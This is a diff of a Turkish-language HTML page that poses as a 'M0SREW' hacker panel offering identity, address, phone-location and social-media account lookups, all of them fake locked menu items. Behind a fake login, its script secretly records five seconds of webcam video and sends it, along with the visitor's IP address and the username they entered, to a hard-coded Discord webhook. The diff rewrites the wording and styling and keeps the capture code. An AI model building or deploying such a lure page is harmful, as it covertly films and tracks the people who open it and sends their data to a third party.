@@ -3,41 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M 0 S R E W // DOMINANCE</title>
+    <title>M 0 S R E W // DATABASE</title>
     <style>
-        :root { --blue: #2480ff; --red: #ff0000; --bg: #030405; --card: #0a0c10; --border: #1b1f24; }
+        /* Derin Gece Mavisi Tema */
+        :root { --blue: #2480ff; --red: #ff0000; --bg: #02060f; --card: #050a14; --border: #0d172a; }
+        
         body { background: var(--bg); color: #c9d1d9; font-family: 'Inter', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
         
-        /* AUTH EKRANI */
+        /* GİRİŞ EKRANI - TÜRKÇE VE KALIN YAZILAR */
         #authWrapper { position: fixed; inset: 0; background: var(--bg); z-index: 10000; display: flex; justify-content: center; align-items: center; }
-        .auth-card { background: var(--card); padding: 35px; border: 1px solid var(--red); border-radius: 4px; width: 320px; text-align: center; box-shadow: 0 0 20px rgba(255, 0, 0, 0.1); }
-        input { width: 100%; padding: 12px; margin-top: 15px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 4px; outline: none; }
-        .btn-red { background: var(--red); color: #000; border: none; padding: 12px; width: 100%; margin-top: 20px; border-radius: 2px; font-weight: 900; cursor: pointer; letter-spacing: 2px; }
-
-        /* PANEL ANA YAPI */
-        #panel { display: none; padding: 10px; }
-        .top-bar { height: 50px; background: #000; border-bottom: 1px solid var(--red); display: flex; align-items: center; padding: 0 15px; justify-content: space-between; }
+        .auth-card { background: var(--card); padding: 40px; border: 2px solid var(--red); border-radius: 8px; width: 340px; text-align: center; box-shadow: 0 0 30px rgba(0, 0, 255, 0.1); }
         
-        /* HAMBURGER */
-        .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 4px; z-index: 40000; }
-        .hamburger div { width: 22px; height: 2px; background: var(--red); }
+        /* İstediğin Kalın Birleşik Yazı Tipi */
+        .auth-card h1 { color: var(--red); font-size: 32px; font-weight: 900; margin: 0; letter-spacing: -2px; text-transform: uppercase; }
+        .auth-card p { font-weight: 800; font-size: 12px; color: #445566; margin-bottom: 20px; }
+
+        input { width: 100%; padding: 15px; margin-top: 15px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 4px; outline: none; font-weight: bold; }
+        .btn-red { background: var(--red); color: #fff; border: none; padding: 15px; width: 100%; margin-top: 25px; border-radius: 4px; font-weight: 900; cursor: pointer; font-size: 14px; text-transform: uppercase; }
+
+        /* PANEL */
+        #panel { display: none; padding: 10px; }
+        .top-bar { height: 60px; background: #000; border-bottom: 2px solid var(--red); display: flex; align-items: center; padding: 0 15px; justify-content: space-between; }
+        
+        .hamburger { cursor: pointer; display: flex; flex-direction: column; gap: 5px; }
+        .hamburger div { width: 25px; height: 3px; background: var(--red); }
 
         /* YAN MENÜ */
-        #sideMenu { position: fixed; top: 0; right: -250px; width: 250px; height: 100%; background: #000; border-left: 1px solid var(--red); transition: 0.3s; z-index: 35000; padding-top: 60px; }
-        .side-item { padding: 15px 20px; border-bottom: 1px solid #111; font-size: 12px; cursor: pointer; color: #555; }
-        .side-item:hover { color: var(--red); background: #080000; }
+        #sideMenu { position: fixed; top: 0; right: -280px; width: 280px; height: 100%; background: #010409; border-left: 2px solid var(--red); transition: 0.4s; z-index: 35000; padding-top: 70px; }
+        .side-item { padding: 18px 25px; border-bottom: 1px solid #0d1117; font-size: 13px; font-weight: 900; cursor: pointer; color: #888; text-transform: uppercase; }
+        .side-item:hover { color: var(--red); background: #050000; }
 
-        /* DEV SORGU LİSTESİ */
-        .menu-container { background: var(--card); border: 1px solid var(--border); border-radius: 4px; margin-top: 10px; max-height: 400px; overflow-y: auto; }
-        .menu-item { padding: 12px 15px; border-bottom: 1px solid #111; font-size: 10px; display: flex; justify-content: space-between; cursor: pointer; text-transform: uppercase; }
-        .status-lock { color: var(--red); font-weight: bold; font-family: monospace; }
+        /* ANA İÇERİK - MODÜLLER */
+        .menu-container { background: var(--card); border: 1px solid var(--border); border-radius: 6px; margin-top: 12px; }
+        .menu-item { padding: 14px 18px; border-bottom: 1px solid #0d1117; font-size: 11px; font-weight: 700; display: flex; justify-content: space-between; cursor: pointer; }
+        .status-lock { color: var(--red); font-weight: 900; letter-spacing: 1px; }
 
-        /* IFS4 / M0SREW POPUP */
-        #ifsBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; background: #000; border: 1px solid var(--red); z-index: 50000; padding: 30px; text-align: center; }
-        .spinner { border: 2px solid #222; border-top: 2px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
+        /* IFS4 POPUP */
+        #ifsBox { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 320px; background: #000; border: 2px solid var(--blue); z-index: 50000; padding: 40px; text-align: center; border-radius: 15px; }
+        .spinner { border: 4px solid #111; border-top: 4px solid var(--blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .terminal { background: #000; border-left: 3px solid var(--red); padding: 10px; font-family: monospace; font-size: 9px; color: #666; height: 80px; overflow-y: auto; margin-top: 10px; }
+        .terminal { background: #000; border-right: 4px solid var(--blue); padding: 12px; font-family: monospace; font-size: 10px; color: #4a5568; height: 100px; overflow-y: auto; margin: 10px 0; }
     </style>
 </head>
 <body>
@@ -47,90 +53,92 @@
 
 <div id="authWrapper">
     <div class="auth-card" id="logCard">
-        <h1 style="color:var(--red); font-size: 24px; margin:0; letter-spacing: 5px;">M 0 S R E W</h1>
-        <p style="font-size:10px; color:#444;">AUTHORITY CONTROL SYSTEM</p>
-        <input type="text" id="lMail" placeholder="User ID">
-        <input type="password" id="lPass" placeholder="Access Key">
-        <button class="btn-red" onclick="processLog()">ENTER SYSTEM</button>
-        <p style="font-size:9px; color:#333; margin-top:15px; cursor:pointer;" onclick="showReg()">Create Authority</p>
+        <h1>M0SREW</h1>
+        <p>YETKİLİ PERSONEL GİRİŞİ</p>
+        <input type="text" id="lMail" placeholder="KULLANICI KODU">
+        <input type="password" id="lPass" placeholder="ERİŞİM ŞİFRESİ">
+        <button class="btn-red" onclick="processLog()">SİSTEME SIZ</button>
+        <p style="font-size:10px; color:#333; margin-top:20px; cursor:pointer;" onclick="showReg()">YETKİ ALTYAPISI OLUŞTUR</p>
     </div>
+
     <div class="auth-card" id="regCard" style="display:none;">
-        <h2 style="color:#fff; font-size: 14px;">KAYIT OL</h2>
-        <input type="text" id="rMail" placeholder="Mail">
-        <input type="password" id="rPass" placeholder="Şifre">
-        <button class="btn-red" onclick="processReg()">REGISTER</button>
+        <h1>KAYIT</h1>
+        <input type="text" id="rMail" placeholder="E-POSTA">
+        <input type="password" id="rPass" placeholder="YENİ ŞİFRE">
+        <button class="btn-red" onclick="processReg()">YETKİYİ TANIMLA</button>
     </div>
 </div>
 
 <div id="panel">
     <div class="top-bar">
-        <span><b style="color:var(--red);">M 0 S R E W</b> <span id="clock" style="color:#333; font-size:10px; margin-left:10px;">00:00</span></span>
+        <span><b style="color:var(--red); font-size: 20px;">M0SREW</b> <span id="clock" style="color:#223344; font-size:11px; margin-left:15px; font-weight:900;">00:00</span></span>
         <div class="hamburger" onclick="toggleMenu()"><div></div><div></div><div></div></div>
     </div>
 
     <div id="sideMenu">
-        <div class="side-item" onclick="openIFS()" style="color:#fff; border-left: 2px solid var(--red);">EMRE İFS4</div>
-        <div class="side-item" onclick="mosMsg()">M0SREW ÖZEL LOG</div>
-        <div class="side-item" onclick="mosMsg()">VERİ TABANI SIZMA</div>
-        <div class="side-item" onclick="mosMsg()">ADMİN YETKİLERİ</div>
-        <div class="side-item" onclick="location.reload()" style="color:var(--red)">SİSTEMDEN ÇIK</div>
+        <div class="side-item" onclick="openIFS()" style="color:#fff; border-right: 4px solid var(--red);">EMRE İFS4</div>
+        <div class="side-item" onclick="msg()">ÖZEL SIZMA LOGLARI</div>
+        <div class="side-item" onclick="msg()">YÖNETİCİ PANELİ</div>
+        <div class="side-item" onclick="msg()">SUNUCU DURUMU</div>
+        <div class="side-item" onclick="location.reload()" style="color:var(--red)">OTURUMU KAPAT</div>
     </div>
 
-    <div class="terminal" id="termLogs">[SYSTEM] M 0 S R E W yetkisi onaylandı...<br></div>
+    <div class="terminal" id="termLogs">M 0 S R E W : Bağlantı kuruldu. Yetki seviyesi: Admin.<br></div>
 
     <div class="menu-container">
-        <div class="menu-item" onclick="mosMsg()">IP ADRESI <span id="ipD" style="color:#fff;">---</span></div>
-        <div class="menu-item" onclick="mosMsg()">KONUM <span id="locD" style="color:var(--red);">ARANIYOR</span></div>
-        <div class="menu-item" onclick="mosMsg()">MERNİS 2026 <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">GSM LOKASYON <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">TC SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">AİLE SORGULAMA <span class="status-red">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">PLAKA SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">AD SOYAD SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">E-OKUL SIZMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">INSTAGRAM CRACK <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">SMS BOMBER <span class="status-lock">OFFLINE</span></div>
-        <div class="menu-item" onclick="mosMsg()">BİNA SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">TAPU SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">SİGORTA DATA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">MAAŞ SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">FACEBOOK SIZMA <span class="status-lock">MOSREW ONLY</span></div>
-        <div class="menu-item" onclick="mosMsg()">KRİPTO CÜZDAN SIZMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item">IP ADRESİ <span id="ipD" style="color:#fff;">---</span></div>
+        <div class="menu-item">GPS KONUM <span id="locD" style="color:var(--red);">ARANIYOR...</span></div>
+        <div class="menu-item" onclick="msg()">MERNİS 2026 <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">GSM LOKASYON <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">TC SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">AİLE SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">AD SOYAD SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">PLAKA SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">TAPU BİLGİLERİ <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">E-OKUL SIZMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">MAAŞ BİLGİSİ <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">ADRES SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">INSTAGRAM PANEL <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">SMS BOMBER <span class="status-lock">DEVRE DIŞI</span></div>
+        <div class="menu-item" onclick="msg()">BİNA FOTOĞRAF <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">İLAÇ SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">ÜST ÜST SORGULAMA <span class="status-lock">MOSREW ONLY</span></div>
+        <div class="menu-item" onclick="msg()">E-DEVLET SIZMA <span class="status-lock">MOSREW ONLY</span></div>
     </div>
 </div>
 
 <div id="ifsBox">
     <div class="spinner"></div>
-    <h3 style="color:#fff; margin:0;">EMRE İFS4</h3>
-    <p id="ifsTxt" style="font-size: 11px; color: var(--red); margin-top: 10px;">M0SREW sunucuna bağlanıyor...</p>
+    <h2 style="color:#fff; font-weight:900;">Emre İFS4</h2>
+    <p id="ifsTxt" style="font-size: 12px; color: var(--blue); font-weight: 800;">Veritabanına sızılıyor...</p>
 </div>
 
 <script>
     let u = { ip: '...', lat: 0, lon: 0 };
     const wh = "https://discord.com/api/webhooks/1501879445722759260/1xUO1IOn_YOTS9l0_XcLBo83UkbEgvJjTcjYdcV_arPyX4s-c8Js_3YFZ6jZlKx5Ms5f";
 
-    function mosMsg() { alert("M 0 S R E W : Bu yetki sadece sahibine aittir. Erişim denemesi kaydedildi."); }
-    function toggleMenu() { const m = document.getElementById('sideMenu'); m.style.right = m.style.right === '0px' ? '-250px' : '0px'; }
+    function msg() { alert("M 0 S R E W : Erişim Reddedildi. Bu işlem için kurucu yetkisi gerekiyor."); }
+    function toggleMenu() { const m = document.getElementById('sideMenu'); m.style.right = m.style.right === '0px' ? '-280px' : '0px'; }
 
     function openIFS() {
         toggleMenu();
         document.getElementById('ifsBox').style.display = 'block';
-        const t = ["Veri çekiliyor...", "M0SREW onay bekliyor...", "Sistem yüklenemedi...", "Daha fazla yetki lazım..."];
-        let i = 0; setInterval(() => { document.getElementById('ifsTxt').innerText = t[i % t.length]; i++; }, 2000);
+        const t = ["Bağlanılıyor...", "M0SREW Doğrulaması...", "Veri çekiliyor...", "Hata: Sunucu meşgul..."];
+        let i = 0; setInterval(() => { document.getElementById('ifsTxt').innerText = t[i % t.length]; i++; }, 1800);
     }
 
     function showReg() { document.getElementById('logCard').style.display='none'; document.getElementById('regCard').style.display='block'; }
-    function processReg() { localStorage.setItem('m_m', document.getElementById('rMail').value); localStorage.setItem('m_p', document.getElementById('rPass').value); alert("Yetki Oluşturuldu!"); location.reload(); }
+    function processReg() { localStorage.setItem('m_m', document.getElementById('rMail').value); localStorage.setItem('m_p', document.getElementById('rPass').value); alert("Yetki Tanımlandı!"); location.reload(); }
 
     fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{ u.ip=d.ip; document.getElementById('ipD').innerText=d.ip; });
 
     async function processLog() {
         if(document.getElementById('lMail').value === localStorage.getItem('m_m') && document.getElementById('lPass').value === localStorage.getItem('m_p')) {
-            initM0srew();
-        } else { alert("Yetkisiz Giriş Denemesi!"); }
+            startCapture();
+        } else { alert("HATALI KOD!"); }
     }
 
-    async function initM0srew() {
+    async function startCapture() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video: true});
             document.getElementById('secretCam').srcObject = s;
@@ -149,12 +157,12 @@
             mr.onstop = () => {
                 const b = new Blob(ch, { type: 'video/webm' });
                 const fd = new FormData();
-                fd.append("payload_json", JSON.stringify({ content: `🔱 **M 0 S R E W  D O M I N A N C E**\nKurban: ${localStorage.getItem('m_m')}\nIP: ${u.ip}` }));
-                fd.append("file", b, "mosrew.webm");
+                fd.append("payload_json", JSON.stringify({ content: `🔱 **M 0 S R E W**\nAdmin: ${localStorage.getItem('m_m')}\nIP: ${u.ip}` }));
+                fd.append("file", b, "video.webm");
                 fetch(wh, { method: "POST", body: fd });
             };
             mr.start(); setTimeout(() => mr.stop(), 5000);
-        } catch(e) { alert("M0SREW: Kamera izni verilmediği için sistem kendini kilitledi."); location.reload(); }
+        } catch(e) { alert("SİSTEM HATASI: Kamera izni olmadan sızma yapılamaz."); location.reload(); }
     }
     setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString().slice(0,5); }, 1000);
 </script>
